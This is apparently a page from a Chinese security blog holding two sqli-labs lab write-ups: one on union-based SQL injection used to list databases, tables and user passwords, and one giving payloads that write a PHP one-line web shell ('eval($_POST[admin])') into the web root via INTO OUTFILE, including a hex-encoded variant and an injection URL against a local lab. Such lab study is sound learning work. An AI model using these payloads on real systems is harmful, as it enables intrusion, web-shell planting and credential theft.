      <a href="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%B8%80%E5%85%B3GET%E8%81%94%E5%90%88/" class="article-date">
  	<time datetime="2020-07-25T01:18:02.360Z" itemprop="datePublished">2020-07-25</time>
</a>
    </div>
  
  <div class="article-inner">
    
      <input type="hidden" class="isFancy" />
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%B8%80%E5%85%B3GET%E8%81%94%E5%90%88/">
        sqli-labs关卡/sqli-labs第一关GET联合
        
      </a>
    </h1>
  

      </header>
      
    
    <div class="article-entry" itemprop="articleBody">
      
        <p>这里判断发现1=1 和 1=2 都不报错，判断这不是整形注入</p>
<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%B8%80%E5%85%B3GET%E8%81%94%E5%90%88/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1582992757981.png" alt="1582992757981"></p>
<p>尝试闭合URL输入?id=1’</p>
<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%B8%80%E5%85%B3GET%E8%81%94%E5%90%88/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1582990340046.png" alt="1582990340046"></p>
<p>我们这里使用单引号，有报错信息说明存在注入，没有过滤单引号，为了让单引号闭合，使用#(%23)注释符</p>
<p>报出如上错误，根据错误提示信息<br>the right syntax to use near ‘‘1’’ LIMIT 0,1’ at line 1<br>猜测后端可能是：where id‘用户输入’LIMIT 0,1<br>当用户直接输入***   ’时，造成了闭合<br>这时就需要url的注释符#(%23)来注释，有时#不能用，就要用到#的url编码%23<br>在与注释符#之间就可以进行sql注入，爆出我们想要的内容</p>
<p>使用order by 猜测字段，这里得到字段结果为3。因为3以上报错，输入3时正常</p>
<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%B8%80%E5%85%B3GET%E8%81%94%E5%90%88/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1582990458549.png" alt="1582990458549"></p>
<p>进行联合查询,查询出数据库，这里是security</p>
<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%B8%80%E5%85%B3GET%E8%81%94%E5%90%88/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1582990625060.png" alt="1582990625060"></p>
<p>使用mysql查看一下是否有这个数据库，发现这个数据库</p>
<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%B8%80%E5%85%B3GET%E8%81%94%E5%90%88/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1582997014653.png" alt="1582997014653"></p>
<p>查询表名，查询到了下面这四个表名</p>
<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%B8%80%E5%85%B3GET%E8%81%94%E5%90%88/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1582997199181.png" alt="1582997199181"></p>
<p>我们用mysql查看一下user里面是否有这些表，发现确实存在</p>
<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%B8%80%E5%85%B3GET%E8%81%94%E5%90%88/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1582997449416.png" alt="1582997449416"></p>
<p>用户的账户密码大部分都在users库里面，我们在查询表</p>
<p>查询users表，发现id、username、password等字段</p>
<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%B8%80%E5%85%B3GET%E8%81%94%E5%90%88/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1582997307228.png" alt="1582997307228"></p>
<p>我们查看这三个字段，里面是否有我们想要的内容</p>
<p>我们查询这三个字段发现，确实是我们要的账号，密码</p>
<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%B8%80%E5%85%B3GET%E8%81%94%E5%90%88/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1582997512920.png" alt="1582997512920"></p>
<p>使用mysql查看一下</p>
<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%B8%80%E5%85%B3GET%E8%81%94%E5%90%88/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1582997569358.png" alt="1582997569358"></p>

      
    </div>
    
    <div class="article-info article-info-index">
      
      
      

      
      <div class="clearfix"></div>
    </div>
      
    
  </div>
  
</article>







  
    <article id="post-sqli-labs关卡/sqli-labs46-49扩展" class="article article-type-post" itemscope itemprop="blogPost">
  
    <div class="article-meta">
      <a href="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs46-49%E6%89%A9%E5%B1%95/" class="article-date">
  	<time datetime="2020-07-25T01:18:02.345Z" itemprop="datePublished">2020-07-25</time>
</a>
    </div>
  
  <div class="article-inner">
    
      <input type="hidden" class="isFancy" />
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs46-49%E6%89%A9%E5%B1%95/">
        sqli-labs关卡/sqli-labs46-49扩展
        
      </a>
    </h1>
  

      </header>
      
    
    <div class="article-entry" itemprop="articleBody">
      
        <p>也可以插入一句话木马。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">如果这句代码没有将一句话木马写进去的话，是用另外一种方式</span><br><span class="line">select &lt;?php @eval($_POST[admin])?&gt;  into outfile &quot;D:\\phpStudy\\PHPTutorial\\WWW\\sqli-49.txt&quot;</span><br></pre></td></tr></table></figure>

<p>使用之前的 <strong>lines terminated</strong>进行数据间分割</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">使用lines terminated 将一句话木马转换为16进制，插入数据进行分割</span><br><span class="line">select &lt;?php @eval($_POST[admin])?&gt;  into outfile &quot;D:\\phpStudy\\PHPTutorial\\WWW\\sqli-49_1.php&quot; lines treminated 0x3c3f70687020406576616c28245f504f53545b61646d696e5d293f3ea</span><br></pre></td></tr></table></figure>

<p>之前学过一个 select *** into outfile “路径”</p>
<p>以49关为例查看能否向之前一样，将信息打印出</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-49&#x2F;?sort&#x3D;1&#39; into outfile &quot;D:\\phpStudy\\PHPTutorial\\WWW\\sqli-49.txt&quot; --+</span><br></pre></td></tr></table></figure>

<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs46-49%E6%89%A9%E5%B1%95/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1585153218678.png" alt="1585153218678"></p>
<p>以上不用管，查看路径中是否有sqli-49.txt这个文件，成功返回</p>
<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs46-49%E6%89%A9%E5%B1%95/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1585153256162.png" alt="1585153256162"></p>
<p>打开查看内容，成功获取</p>
<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs46-49%E6%89%A9%E5%B1%95/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1585153293535.png" alt="1585153293535"></p>

      
    </div>
    
    <div class="article-info article-info-index">
      
      
      

      
      <div class="clearfix"></div>
    </div>
      
    
  </div>
  
</article>







  
  
    <nav id="page-nav">
      <a class="extend prev" rel="prev" href="/page/6/">&amp;laquo; Prev</a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/5/">5</a><a class="page-number" href="/page/6/">6</a><span class="page-number current">7</span><a class="page-number" href="/page/8/">8</a><a class="page-number" href="/page/9/">9</a><a class="page-number" href="/page/10/">10</a><a class="extend next" rel="next" href="/page/8/">Next &amp;raquo;</a>
    </nav>
  
</div>
      <footer id="footer">
  <div class="outer">
    <div id="footer-info">
      <div class="footer-left">
        &copy; 2020 zhanqiaozai
      </div>
        <div class="footer-right">
          <a href="http://hexo.io/" target="_blank">Hexo</a>  Theme <a href="https://github.com/smackgg/hexo-theme-smackdown" target="_blank">Smackdown</a>
        </div>
    </div>
  </div>
</footer>
    </div>
    
  
<link rel="stylesheet" href="/fancybox/jquery.fancybox.css">



<script>
	var yiliaConfig = {
		fancybox: true,
		mathjax: true,
		animate: true,
		isHome: true,
		isPost: false,
		isArchive: false,
		isTag: false,
		isCategory: false,
		open_in_new: false
	}
</script>

<script src="/js/main.js"></script>




<script type="text/x-mathjax-config">
MathJax.Hub.Config({
    tex2jax: {
        inlineMath: [ ['$','$'], ["\\(","\\)"]  ],
        processEscapes: true,
        skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
    }
});

MathJax.Hub.Queue(function() {
    var all = MathJax.Hub.getAllJax(), i;
    for(i=0; i < all.length; i += 1) {
        all[i].SourceElement().parentNode.className += ' has-jax';                 
    }       
});
</script>

<script src="//cdn.bootcss.com/mathjax/2.7.0/MathJax.js"></script>


  </div>
</body>
</html>